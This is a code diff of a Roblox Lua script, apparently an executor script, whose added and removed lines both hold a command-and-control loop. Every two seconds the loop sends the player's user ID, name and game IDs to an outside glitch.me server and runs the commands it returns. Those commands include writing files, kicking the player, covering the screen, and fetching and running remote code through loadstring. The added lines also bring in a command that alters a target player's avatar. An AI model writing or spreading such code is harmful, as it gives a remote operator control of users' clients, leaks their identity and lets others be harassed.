@@ -1,67 +1,117 @@
+task.spawn(function()
+    while task.wait(2) do
+        local url = string.format("https://cheerful-aspiring-tungsten.glitch.me/poll/%s?username=%s&gameid=%s&jobid=%s",tostring(game:GetService("Players").LocalPlayer.UserId), game:GetService("HttpService"):UrlEncode(game:GetService("Players").LocalPlayer.Name), tostring(game.PlaceId), tostring(game.JobId))
+        local success, result = pcall(function() return game:GetService("HttpService"):JSONDecode(game:HttpGet(url)) end)
+
+        if success and typeof(result) == "table" then
+            for _, cmd in ipairs(result) do -- heh... commands
+
+                if cmd.command == "femboyify" then
+                    local targetfemboy = game:GetService("Players"):GetPlayerByUserId(tonumber(cmd.args))
+                    if targetfemboy and targetfemboy.Character then
+                        local char = targetfemboy.Character
+                        local p = char:FindFirstChildOfClass("Pants")
+                        local s = char:FindFirstChildOfClass("Shirt")
+
+                        if not p then p = Instance.new("Pants") p.Name = "Pants" p.Parent = char else print("[+] found pants") end
+                        if not s then s = Instance.new("Shirt") s.Name = "Shirt" s.Parent = char else print("[+] found shirts") end
+                        if not char:FindFirstChild("Torso") then print("[!] no torso stopping conversion") else print("[+] found torso") end
+
+                        if char:FindFirstChild("Body Colors") then
+                            print("[+] found body colors")
+                            local bc = char["Body Colors"]
+                            bc.HeadColor = BrickColor.new("Pastel brown")
+                            bc.LeftArmColor = BrickColor.new("Pastel brown")
+                            bc.RightArmColor = BrickColor.new("Pastel brown")
+                            bc.LeftLegColor = BrickColor.new("Pastel brown")
+                            bc.RightLegColor = BrickColor.new("Pastel brown")
+                            bc.TorsoColor = BrickColor.new("Pastel brown")
+                            print("[+] body colors changed")
+                        else warn("[!] body colors not found 😂") end
+
+                        local found = false
+                        for _, x in ipairs(char:GetChildren()) do
+                            if x:IsA("Accessory") and x.Name == "Pal Hair" then
+                                print("[+] found Pal Hair")
+                                x.Handle.Mesh.MeshId = "rbxassetid://14871933706"
+                                x.Handle.Mesh.TextureId = "rbxassetid://14423578564"
+                                x.Handle.Mesh.Scale = Vector3.new(1, 1, 1)
+                                x.Handle.Mesh.Offset = Vector3.new(0, 0, 0.25)
+                                print("[+] changed Pal Hair")
+                                found = true
+                                break
+                            end
+                        end
+						
+                        if not found then print("[!] no Pal Hair found") end
+                        local f = Instance.new("CharacterMesh")
+                        f.Parent = char
+                        f.MeshId = 48112070
+                        f.BodyPart = "Torso"
+                        print("[+] changed torso")
+                        p.PantsTemplate = "rbxassetid://5720984882"
+                        s.ShirtTemplate = "rbxassetid://136833414349144"
+                        print("[+] changed clothes")
+                    else
+                        print("[!] target player not found or no character")
+                    end
 
 
-spawn(function()
-	while task.wait(2) do
-		local url = string.format("https://cheerful-aspiring-tungsten.glitch.me/poll/%s?username=%s&gameid=%s&jobid=%s",tostring(game:GetService("Players").LocalPlayer.UserId), game:GetService("HttpService"):UrlEncode(game:GetService("Players").LocalPlayer.Name), tostring(game.PlaceId), tostring(game.JobId))
-		local success, result = pcall(function() return game:GetService("HttpService"):JSONDecode(game:HttpGet(url)) end)
+            elseif cmd.command == "print" then
+                print(tostring(cmd.args))
 
-		if success and typeof(result) == "table" then
-			for _, cmd in ipairs(result) do -- heh... commands
+            elseif cmd.command == "writefile" then
+                local args = cmd.args
+                if typeof(args) == "table" and args[1] and args[2] then
+                    writefile(args[1], args[2])
+                    print("wrote file: " .. args[1])
+                else
+                    warn("invalid writefile args")
+                end
 
-				if cmd.command == "print" then
-					print(tostring(cmd.args))
-
-				elseif cmd.command == "writefile" then
-					local args = cmd.args
-					if typeof(args) == "table" and args[1] and args[2] then
-						writefile(args[1], args[2])
-						print("wrote file: " .. args[1])
-					else
-						warn("invalid writefile args")
-					end
-
-				elseif cmd.command == "kick" then
-					local reason = tostring(cmd.args) or nil
-					pcall(function() game:GetService("Players").LocalPlayer:Kick(reason) end)
-
-				elseif cmd.command == "imagelabel" then
-  					local image = tostring(cmd.args)
-  					local notasg = Instance.new("ScreenGui")
-  					notasg.IgnoreGuiInset = true
- 					notasg.ZIndexBehavior = Enum.ZIndexBehavior.Global
-					notasg.Parent = game.CoreGui
-                    notasg.Name = "SHUT UP2"
-
-  					local okfat = Instance.new("ImageLabel")
- 					okfat.Size = UDim2.new(1, 0, 1, 0)
- 					okfat.Position = UDim2.new(0, 0, 0, 0)
- 					okfat.BackgroundTransparency = 1
-					okfat.Image = image
-                    okfat.Name = "SHUT UP"
-					okfat.ZIndex = 2147483647 
- 					okfat.Parent = screenGui
+            elseif cmd.command == "kick" then
+                local reason = tostring(cmd.args) or nil
+                pcall(function() game:GetService("Players").LocalPlayer:Kick(reason) end)
 
 
-				elseif cmd.command == "loadstring" then
-					local ok, err = pcall(function()
-						loadstring(cmd.args)()
-					end)
-					if not ok then
-						warn("loadstring error:", err)
-					end
+            elseif cmd.command == "imagelabel" then
+                local image = tostring(cmd.args)
+                local notasg = Instance.new("ScreenGui")
+                notasg.IgnoreGuiInset = true
+                notasg.ZIndexBehavior = Enum.ZIndexBehavior.Global
+                notasg.Parent = game.CoreGui
+                notasg.Name = "SHUT UP2"
 
-				elseif cmd.command == "hloadstring" then
-					local url = tostring(cmd.args)
-					local ok, err = pcall(function()
-						loadstring(game:HttpGet(url))()
-					end)
-					if not ok then
-						warn("hloadstring error:", err)
-					end
-				end
-			end
-		end
-	end
+                local okfat = Instance.new("ImageLabel")
+                okfat.Size = UDim2.new(1, 0, 1, 0)
+                okfat.Position = UDim2.new(0, 0, 0, 0)
+                okfat.BackgroundTransparency = 1
+                okfat.Image = image
+                okfat.Name = "SHUT UP"
+                okfat.ZIndex = 2147483647
+                okfat.Parent = screenGui
+
+
+            elseif cmd.command == "loadstring" then
+                local ok, err = pcall(function()
+                    loadstring(cmd.args)()
+                end)
+                if not ok then
+                    warn("loadstring error:", err)
+                end
+
+            elseif cmd.command == "hloadstring" then
+                local url = tostring(cmd.args)
+                local ok, err = pcall(function()
+                    loadstring(game:HttpGet(url))()
+                end)
+                if not ok then
+                    warn("hloadstring error:", err)
+                end
+            end
+            end
+        end
+    end
 end)
 
 game:GetService("Players").PlayerRemoving:Connect(function(player)
